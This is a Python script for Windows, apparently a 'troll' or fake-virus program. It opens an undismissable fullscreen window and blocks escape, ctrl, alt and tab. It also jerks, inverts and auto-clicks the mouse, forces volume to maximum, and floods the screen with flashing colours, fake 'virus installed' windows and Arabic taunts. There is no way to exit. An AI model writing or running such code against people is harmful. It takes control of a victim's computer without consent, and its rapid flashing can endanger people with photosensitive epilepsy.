import tkinter as tk
from PIL import Image, ImageTk, ImageGrab
import pygame
import pyautogui
import keyboard
import threading
import time
import sys
import os
import random
import ctypes

if getattr(sys, 'frozen', False):
    base_path = os.path.dirname(sys.executable)
else:
    base_path = os.path.dirname(__file__)

yaderka_path = os.path.join(base_path, "yaderka.mp3")
random_path = os.path.join(base_path, "random")

pygame.mixer.init()
pygame.mixer.music.load(yaderka_path)
pygame.mixer.music.play(-1)

random_sounds = []
if os.path.exists(random_path):
    for file in os.listdir(random_path):
        if file.endswith((".mp3", ".wav", ".ogg")):
            try:
                snd = pygame.mixer.Sound(os.path.join(random_path, file))
                random_sounds.append(snd)
            except:
                pass

root = tk.Tk()
root.attributes("-fullscreen", True)
root.overrideredirect(True)
root.protocol("WM_DELETE_WINDOW", lambda: None)
root.attributes("-topmost", True)
root.focus_force()
root.grab_set()

screen_w, screen_h = root.winfo_screenwidth(), root.winfo_screenheight()
running = [True]

random_images = []
if os.path.exists(random_path):
    for file in os.listdir(random_path):
        if file.endswith((".png", ".jpg", ".jpeg")):
            try:
                img = Image.open(os.path.join(random_path, file))
                random_images.append(img)
            except:
                pass

def flash_bg():
    colors = ["black","red","green","blue","yellow","magenta","cyan","white"]
    while running[0]:
        root.configure(bg=random.choice(colors))
        time.sleep(0.1)

def pixel_screen():
    while running[0]:
        img = ImageGrab.grab()
        img = img.resize((screen_w//25, screen_h//25)).resize((screen_w, screen_h))
        photo = ImageTk.PhotoImage(img)
        lbl = tk.Label(root, image=photo)
        lbl.image = photo
        lbl.place(x=0, y=0)
        time.sleep(0.3)

def spawn_images():
    while running[0]:
        if random_images:
            img = random.choice(random_images)
            img = img.resize((random.randint(50, 300), random.randint(50, 300)))
            photo = ImageTk.PhotoImage(img)
            lbl = tk.Label(root, image=photo, borderwidth=0)
            lbl.image = photo
            lbl.place(x=random.randint(0, screen_w-200), y=random.randint(0, screen_h-200))
        time.sleep(0.2)

def spawn_arabic_text():
    texts = [
        "هاهاهاهاهاهاها",
        "الموت للويندوز",
        "تنزيل أداة ريكو",
        "بسم الله الرحمن الرحيم",
        "الفوضى الكاملة",
        "الوضع الفوضوي مفعل"
    ]
    while running[0]:
        txt = random.choice(texts)
        lbl = tk.Label(root, text=txt,
                       fg=random.choice(["white","red","yellow","lime","cyan"]),
                       font=("Arial", random.randint(20, 60), "bold"))
        lbl.place(x=random.randint(0, screen_w-300), y=random.randint(0, screen_h-200))
        time.sleep(0.1)

def fake_installers():
    texts = ["تنزيل أداة...", "جارٍ التثبيت...", "اكتمل الفيروس"]
    while running[0]:
        win = tk.Toplevel(root)
        win.overrideredirect(True)
        win.geometry(f"{random.randint(200,400)}x{random.randint(100,200)}+{random.randint(0,screen_w-200)}+{random.randint(0,screen_h-200)}")
        lbl = tk.Label(win, text=random.choice(texts), fg="red", bg="black", font=("Courier", 16, "bold"))
        lbl.pack(expand=True, fill="both")
        win.after(random.randint(1000,2000), win.destroy)
        time.sleep(random.uniform(0.3, 0.8))

def spam_sounds():
    while running[0]:
        if random_sounds:
            for _ in range(random.randint(1, 3)):
                snd = random.choice(random_sounds)
                snd.play()
        time.sleep(random.uniform(0.2, 0.8))

def mouse_spam():
    while running[0]:
        x, y = pyautogui.position()
        pyautogui.moveTo(x + random.randint(-400, 400), y + random.randint(-400, 400), 0.01)

def block_keys():
    while running[0]:
        for key in ["w","a","s","d","esc","ctrl","alt","tab"]:
            keyboard.block_key(key)
        time.sleep(0.05)

def invert_mouse():
    while running[0]:
        x, y = pyautogui.position()
        pyautogui.moveTo(screen_w-x, screen_h-y, 0.05)

def click_spam():
    while running[0]:
        pyautogui.click(random.randint(0, screen_w), random.randint(0, screen_h))
        time.sleep(0.1)

def text_rain():
    texts = ["هاهاها", "الفوضى", "ريكـــو", "بسم الله"]
    while running[0]:
        for i in range(15):
            lbl = tk.Label(root, text=random.choice(texts),
                           fg="lime", font=("Courier", random.randint(10,20), "bold"))
            lbl.place(x=random.randint(0, screen_w-50), y=random.randint(0, screen_h-50))
        time.sleep(0.15)

def window_spam():
    texts = ["هاهاها", "تنزيل...", "ريكــو"]
    while running[0]:
        win = tk.Toplevel(root)
        win.overrideredirect(True)
        win.geometry("150x80+"+str(random.randint(0,screen_w-200))+"+"+str(random.randint(0,screen_h-200)))
        tk.Label(win, text=random.choice(texts), fg="cyan", bg="black").pack(expand=True, fill="both")
        win.after(800, win.destroy)
        time.sleep(0.1)

def force_volume():
    while running[0]:
        ctypes.windll.winmm.waveOutSetVolume(0, 0xFFFF | (0xFFFF << 16))
        time.sleep(0.5)

effects = [
    flash_bg, pixel_screen, spawn_images, spawn_arabic_text,
    fake_installers, spam_sounds, mouse_spam, block_keys,
    invert_mouse, click_spam, text_rain, window_spam, force_volume
]

for f in effects:
    threading.Thread(target=f, daemon=True).start()

root.mainloop()
